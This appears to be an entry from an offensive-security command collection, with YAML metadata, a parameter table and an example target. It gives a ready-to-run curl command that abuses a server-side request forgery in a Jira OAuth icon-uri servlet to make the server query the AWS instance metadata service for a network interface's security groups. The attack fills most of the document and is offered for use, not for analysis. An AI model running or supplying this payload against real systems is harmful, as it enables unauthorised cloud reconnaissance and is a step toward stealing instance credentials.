---
data: >-
  curl
  "https://target-domain/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/latest/meta-data/network/interfaces/macs/XX:XX:XX:XX:XX:XX/security-groups"
tags:
  - ssrf
  - aws
  - security
type: command
output: HTTP Devforce SSH devforce_internal
executor: bash
platforms:
  - Linux
  - AWS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:08:55.284Z'
id: 52ce50cc-2a1e-4daa-9729-cb85807f87db
verified: false
validated: true
submitted: true
---
# curl-ssrf-security-groups

## Command

```bash
curl "https://target-domain/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/latest/meta-data/network/interfaces/macs/XX:XX:XX:XX:XX:XX/security-groups"
```

## Description

Extracts security group names associated with the interface.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `target-domain` | Vulnerable app domain | Yes |
| `MAC` | Network interface MAC | Yes |

## Examples

### Basic Usage

```bash
curl "https://jira.dod.example/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/latest/meta-data/network/interfaces/macs/02:ab:cd:ef:01:02/security-groups"
```

## Expected Output

List of security groups.

## Related

- [[Related Procedure: Retrieve-AWS-Instance-Metadata-via-SSRF]]
